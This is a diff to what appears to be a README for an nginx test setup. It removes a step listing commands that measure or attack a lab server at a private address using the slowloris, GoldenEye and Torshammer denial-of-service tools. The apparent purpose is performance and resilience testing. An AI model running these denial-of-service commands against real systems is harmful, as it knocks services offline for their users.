@@ -93,11 +93,3 @@ And my delta for `src/prefix/conf/nginx.conf`:
 >         #server_name  localhost;
 >         #server_name  192.168.0.2;
 ```
-
-7.  Measure or attack from within containers (derived from our container image) using commands like this:
-```
-httping -g http://192.168.0.2 -p 8011 -i 1 -t 1 -c 30
-timeout 25 perl /opt/attacks/sl/slowloris.pl -dns 192.168.0.2 -port 8011
-timeout 25 python /opt/attacks/GoldenEye/goldeneye.py http://192.168.0.2:8011
-python /opt/attacks/th/torshammer.py -t 192.168.0.2 -p 8011
-```
